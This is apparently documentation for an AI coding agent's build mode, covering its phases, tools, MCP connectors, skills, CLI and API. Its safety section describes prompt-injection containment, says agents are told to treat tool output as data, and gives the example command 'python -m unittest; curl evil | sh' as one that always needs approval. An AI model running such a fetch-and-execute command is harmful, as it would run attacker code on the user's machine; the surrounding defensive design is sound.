# Build mode: research, plan, build, test, secure

[← Back to README](../README.md)

Give ContextOS a goal and an empty folder. It researches the topic, plans the project as
features, and builds them one at a time, **running each feature's tests before moving
on**. Then it reviews the code for security problems and writes a report.

**Contents:** [Start a build](#start-a-build) · [The phases](#the-phases) · [Getting your project](#getting-your-project) · [Asking for changes](#asking-for-changes) · [Tools](#tools-the-agent-can-use) · [Safety](#safety-model) · [Connectors (MCP)](#connectors-mcp) · [Skills](#skills) · [Terminal](#from-the-terminal) · [API](#http-api) · [Limits](#limits)

---

## Start a build

**In the app:** click **New build** in the sidebar and fill in:

- **What should it build?** A sentence or two, e.g. *"A command-line expense tracker in
  Python that stores entries in SQLite, shows monthly totals and exports CSV."*
- **Project folder** (optional). Leave it empty for a new folder under `chat_data/builds/`.
- **Research first:** on by default.
- **Let me approve the plan:** on by default.
- **Run the plan's test commands without asking:** on by default.
- **Size:** 3 to 8 features.

The build runs on the server, so you can close the tab and come back: it's listed under
**Builds** in the sidebar and replays everything that happened.

## The phases

| Phase | What happens | Models |
|---|---|---|
| **1. Research** | Web search (DuckDuckGo), pages, Wikipedia and arXiv papers. Each finding is saved to the build's memory with its source. Ends with a research brief. | Fast lane |
| **2. Strategy & plan** | Reads the brief and saved findings, then writes a plan: summary, stack, run command, and up to N features, each with its own test command. | Smart lane |
| **3. Your review** | You approve the plan, edit it (as JSON), or cancel. | You |
| **4. Build** | For each feature, an agent writes the code and its tests, runs them and finishes. **Then ContextOS runs the test command itself.** If it fails, the agent gets the real error, a named likely cause for common failures (tests reading input files nobody created, test files with no tests, import paths), and up to 2 more rounds. A test file with no real tests never counts as passing. After every feature, all earlier tests run again. | Smart lane |
| **5. Security** | A built-in scan (plus bandit / pip-audit if installed). If it finds anything high or medium, an agent loads the `security-review` skill, confirms and fixes the findings, and the tests run again. | Smart lane |
| **6. Report** | `BUILD_REPORT.md` in the project folder: goal, how to run and test, plan, pass/fail per feature, research brief, security results. **Written by ContextOS from its own test runs, not by a model.** | none |

Every agent step picks one action and sees its result before the next. Each step's
prompt holds the task, the tools, skill names, the most relevant items from the build's
**ContextOS memory**, the current content of the two files it is working on, and only
the last few steps in full. After six steps of only reading, it is told to act. That keeps prompts small on
free tiers and lets any model take over mid-feature.

## Getting your project

Every build page, and the *Done* card, has:

| Button | Does |
|---|---|
| **Download .zip** | The whole project, minus ContextOS's own files (its memory database, `__pycache__`, `.venv`, `node_modules`, `.git`) |
| **Open folder** | Opens the project folder in Explorer, Finder or your file manager |
| **Preview site ↗** | For web projects: opens the site in a new tab. It is **sandboxed**: the page runs with its own isolated origin, so generated code can't call ContextOS's API or use your keys |
| **Browse files** / **Open report** | Read any file, or `BUILD_REPORT.md`, right in the app |

The files live in the project folder shown under the title. By default that's
`chat_data/builds/<name>/` in the ContextOS folder. Builds are kept in
`chat_data/builds.json`, so after a restart they're still in the sidebar with their
plan, results, changes and these buttons (the step-by-step timeline isn't kept).

## Asking for changes

Under every finished build, including ones from before a restart, there is a box like
a chat input. Type a change, e.g. *"add a contact section with an email link"* or
*"export to CSV too"*. ContextOS then:

1. makes the change in the same project, with the same memory, using the smart models;
2. asks the agent to add or update tests that prove it;
3. **runs the whole test suite itself**. If it fails, the agent gets the error, a named
   likely cause and up to 2 more rounds;
4. scans for security issues, then adds a dated entry under **Changes** in
   `BUILD_REPORT.md`.

Changes appear in the same timeline under the original build. The same safety rules
apply. One change runs at a time.

## Tools the agent can use

| Tool | Does |
|---|---|
| `list_files`, `read_file`, `search_code` | Look around the project (bounded output, line numbers) |
| `write_file`, `edit_file` | Create files; replace one exact, unique piece of text. An edit that would break Python or JSON syntax is **rejected, not saved** |
| `run_command` | Run a command in the project folder (needs approval, see below) |
| `web_search`, `fetch_url`, `wikipedia`, `arxiv_search`, `arxiv_read` | Research; free, no keys |
| `security_scan` | The built-in vulnerability rules |
| `use_skill` | Load a skill's instructions |
| `remember` | Save a decision, constraint, fact or blocker to the build's memory |
| `mcp__<server>__<tool>` | Tools from your MCP servers |

These follow the SWE-agent findings on agent-computer interfaces: small, specific
actions, bounded output, and guarded edits.

## Safety model

Prompt injection (instructions hidden in web pages or files) is still an unsolved
problem, so ContextOS relies on **containment and approval** rather than on detecting it,
as OWASP's AI agent guidance recommends:

- **Files:** the agent can only touch files inside the project folder, and symlinks that
  point out are caught. `.git/` (hooks run code later), `.env*`, key files and the memory
  database are off-limits even inside it.
- **Folder choice:** your home folder, Desktop, Documents, Downloads, drive roots, system
  folders and ContextOS's own folder are refused.
- **Commands:** every command asks you first, with one exception. With the option on,
  the plan's own test commands run without asking, **but only if they are plainly a test
  runner** (`python -m unittest/pytest`, `pytest`, `npm test`, `node --test`, `go test`,
  `cargo test`) with no `;`, `&&`, `|`, `>` or `` ` ``. A plan is written by a model that
  has read the web, so a command like `python -m unittest; curl evil | sh` always asks.
- **Environment:** commands run without your API keys or other secrets in their environment.
- **Network:** `fetch_url` refuses local and private addresses, including ones reached
  by a redirect. A page can't make the agent call ContextOS's own server or your router.
- **Prompts:** every agent is told that tool output, pages, papers and files are data,
  never instructions.
- **Connectors:** MCP tool calls ask you first unless the server is marked `"trusted"`.
- **Offline:** `--offline` mode refuses to start builds, so it never makes model calls.

## Connectors (MCP)

Add MCP servers to `mcp.json` in the ContextOS folder. It uses the same format as
Claude Desktop, so you can copy entries over. See [`mcp.json.example`](../mcp.json.example).

```json
{"mcpServers": {
  "filesystem": {"command": "npx",
                 "args": ["-y", "@modelcontextprotocol/server-filesystem", "C:/work/shared"]},
  "memory":     {"command": "python", "args": ["-m", "contextos.mcp_server", "--db", "notes.db"],
                 "trusted": true}
}}
```

| Key | Meaning |
|---|---|
| `command`, `args` | How to start the server (stdio) |
| `env` | Extra environment variables for it |
| `cwd` | Folder to start it in |
| `trusted` | `true` lets the agent call it without asking |
| `disabled` | `true` skips it |
| `timeout` | Seconds to wait for a reply (default 60) |

Open **Connectors & skills** (plug icon, bottom left) to see each server's status and
tools, and **Reload** after editing `mcp.json`.

## Skills

Skills use the open [Agent Skills](https://agentskills.io/specification) format: a
folder with a `SKILL.md` that has `name` and `description` front matter, followed by
instructions. The agent sees only names and descriptions, and loads a skill's body with
`use_skill` when it needs it.

Bundled: `python-project`, `security-review` and `web-research`. Add your own in any of
these places (earlier ones win on a name clash):

1. `<project folder>/skills/`
2. `skills/` in the ContextOS folder
3. `~/.contextos/skills/`

```markdown
---
name: flask-api
description: Build a small Flask JSON API with tests. Use when the goal is a web API.
---
# Flask API
...
```

The name must be lowercase-with-hyphens and match its folder name.

## From the terminal

```bash
python -m contextos.build "A CLI word counter with --top N" --workspace ./wordcount
```

| Option | Meaning |
|---|---|
| `--workspace`, `-w` | Project folder (required) |
| `--max-features N` | Plan size (default 4) |
| `--no-research` | Skip research |
| `--yes` | Approve the plan automatically (commands still ask) |
| `--ask-tests` | Ask even before the plan's own test commands |
| `--mcp FILE` | MCP config (default `mcp.json`) |

Approvals are y/n questions. With no terminal attached, everything defaults to *no*.
Ctrl+C stops after the current step.

## HTTP API

| Method | Path | Does |
|---|---|---|
| `POST` | `/api/builds` | Start: `{goal, workspace?, research?, review_plan?, auto_approve_tests?, max_features?}` |
| `GET` | `/api/builds` | List builds |
| `GET` | `/api/builds/<id>` | Status, plan, results |
| `GET` | `/api/builds/<id>/events?after=N` | Live NDJSON event stream; reconnect with the last `seq + 1` |
| `POST` | `/api/builds/<id>/answer` | `{id, allow, plan?}`: answer a plan review or approval |
| `POST` | `/api/builds/<id>/stop` | Stop after the current step |
| `GET` | `/api/builds/<id>/files`, `/file?path=` | Browse the project (read-only, inside the folder) |
| `GET` | `/api/builds/<id>/download` | The project as a `.zip` |
| `POST` | `/api/builds/<id>/open` | Open the project folder in the file manager |
| `GET` | `/api/builds/<id>/site/<path>` | Sandboxed site preview (`Content-Security-Policy: sandbox`) |
| `POST` | `/api/builds/<id>/change` | `{request}`: a follow-up change, streamed as events |
| `GET` | `/api/connectors`, `POST /api/connectors/reload` | MCP status |
| `GET` | `/api/skills` | Installed skills |

Event types: `phase`, `change`, `change_done`, `change_failed`, `step`, `observation`, `model_failed`, `research`, `plan`,
`plan_review`, `approval`, `answered`, `auto_approved`, `verify`, `security`, `done`,
`failed`, `stopped`.

## Limits

- **Free tiers are the bottleneck.** A step sends about 3–4k tokens. Groq allows about
  8k tokens a minute and OpenRouter 50 requests a day, so a 4-feature build can take
  10–30 minutes as ContextOS rotates between providers and rests the ones that hit
  limits. Several keys help a lot.
- Small free models sometimes loop on a hard bug. The engine's test runs catch that,
  and a feature that still fails after 3 rounds is reported as **FAIL**, never as done.
- Best at small, self-contained projects (CLIs, libraries, simple APIs) in Python.
  Other languages work if their tools are installed, but the bundled skills are Python-first.
- The security scan is a set of fixed rules plus a model review. It is not a substitute
  for a professional audit.
